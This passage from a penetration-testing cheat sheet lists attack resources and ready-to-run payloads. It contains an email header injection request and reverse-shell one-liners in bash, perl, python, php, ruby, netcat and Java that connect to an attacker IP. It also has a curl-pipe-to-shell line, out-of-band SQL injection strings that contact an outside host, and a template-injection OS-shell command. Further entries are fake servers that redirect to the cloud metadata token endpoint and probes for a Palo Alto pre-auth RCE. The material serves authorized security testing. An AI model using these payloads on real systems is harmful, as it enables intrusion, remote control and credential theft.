<br>```POST /contact.php HTTP/1.1```
<br>```Host: www.example2.com```
<br>``` ```
<br>```name=Best Product\nbcc: everyone@example3.com&replyTo=blame_anna@example.com&message=Buy my product!```

### Reverse Shell
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
<br># If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.
<br># Bash
<br>```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```

<br># PERL
<br>```perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

<br># Python
<br>```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

<br># PHP
<br>```php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'```

<br># Ruby
<br>```ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'```

<br># Netcat
<br>```nc -e /bin/sh 10.0.0.1 1234```
<br>```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f```

<br># Java
<br>```r = Runtime.getRuntime()```
<br>```p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])```
<br>```p.waitFor()```

<br># xterm
<br>```xterm -display 10.0.0.1:1```
<br>```Xnest :1```
<br>```xhost +targetip```

https://reverse-shell.sh/
<br># Reverse Shell as a Service
<br>```nc -l 1337```
<br>```curl https://reverse-shell.sh/yourip:1337 | sh```

https://github.com/calebstewart/pwncat
<br># pwncat is a post-exploitation platform for Linux targets.

### <a name="SQLi-Manual"></a>SQLi (SQL Injection)
https://arxiv.org/abs/1303.3047
<br># This paper describes an advanced SQL injection technique where DNS resolution process is exploited for retrieval of malicious SQL query results.

<br># Oracle
<br>```'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'```
<br>```'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'```
<br>```'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'```
<br>```'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'```

<br># MySQL
<br>```'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'```

<br># Microsoft SQL Server
<br>```'+;EXEC('master..xp_dirtree"\\xpto.example.com\"');+'```
<br>```'+;EXEC('master..xp_fileexist"\\xpto.example.com\"');+'```
<br>```'+;EXEC('master..xp_subdirs"\\xpto.example.com\"');+'```

<br># PostgreSQL
<br>```'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'```

### <a name="SSTI"></a>SSTI (Server Side Template Injection)
https://www.youtube.com/watch?v=SN6EVIG4c-0
<br># Template Injections (SSTI) in 10 minutes

https://portswigger.net/research/server-side-template-injection
<br># Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.

https://github.com/epinna/tplmap
<br># Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system.
<br>```tplmap.py --os-shell -u 'http://www.example.com/page?name=John'```

### <a name="WebDAV"></a>WebDAV (Web Distributed Authoring and Versioning)
http://www.webdav.org/cadaver/
<br># cadaver is a command-line WebDAV client for Unix.

https://github.com/cldrn/davtest
<br># This program attempts to exploit WebDAV enabled servers.

### Generic Tools
https://gchq.github.io/CyberChef/
<br># The Cyber Swiss Army Knife

https://packettotal.com/
<br># Pcap analysis and samples

### <a name="General-Manual"></a>General
https://httpbin.org/
<br># A simple HTTP Request & Response Service.

<br># Fake HTTP Server
<br>```while true ; do echo -e "HTTP/1.1 200 OK\nContent-Length: 0\n\n" | nc -vl 1.2.3.4 80; done```
<br>```socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'```
<br>```socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'```
<br>```FILE=image.jpg;socat -v -d -d TCP-LISTEN:80,fork "SYSTEM:/bin/echo 'HTTP/1.1 200 OK';/bin/echo 'Content-Length: '`wc -c<$FILE`;/bin/echo 'Content-Type: image/png';/bin/echo;dd 2>/dev/null<$FILE"``` # Present an image
<br>```python2 -m SimpleHTTPServer 8080```
<br>```python3 -m http.server 8080```
<br>```php -S 0.0.0.0:80```
<br>```ruby -run -e httpd . -p 80```
<br>```busybox httpd -f -p 80```
    
<br># Fake HTTPS Server
<br>```openssl req -new -x509 -keyout test.key -out test.crt -nodes```
<br>```cat test.key test.crt > test.pem```
<br>```socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=test.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'```
<br>```socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=web.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'```
<br>```stunnel stunnel.conf``` # Check https://www.stunnel.org/
<br># Python 3 Simple HTTPS Server
```
    import http.server, ssl
    server_address = ('0.0.0.0', 443)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='/path/cert.pem', ssl_version=ssl.PROTOCOL_TLS)
    httpd.serve_forever()
```

<br># Fake FTP Server
<br>```python -m pyftpdlib --directory=/tmp/dir/ --port=21```

<br># Check HTTP or HTTPS
<br>```while read i; do curl -m 15 -ki http://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt```
<br>```while read i; do curl -m 15 -ki https://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt```

<br># Ten requests in parallel
<br>```xargs -I % -P 10 curl -H 'Connection: close' -s -D - -o /dev/null https://example.com < <(printf '%s\n' {1..10000})```

<br># Access target directly through IP address
<br>```http://1.2.3.4```
<br>```https://1.2.3.4```

<br># Trim space and newlines on bash variable
<br>```"${i//[$'\t\r\n ']}"```

https://gtfobins.github.io/
<br># GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.

https://www.guyrutenberg.com/2014/05/02/make-offline-mirror-of-a-site-using-wget/
<br># Make Offline Mirror of a Site using wget
<br>```wget -mkEpnp https://www.example.com/```

<br># Referer spoofing
<br>```<base href="https://www.google.com/">```
<br>```<style>```
<br>```@import 'https://CSRF.vulnerable.example/';```
<br>```</style>```

https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
<br># Check PreAuth RCE on Palo Alto GlobalProtect
<br>```time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr >/dev/null```
<br>```time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr >/dev/null```
<br>```time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr >/dev/null```
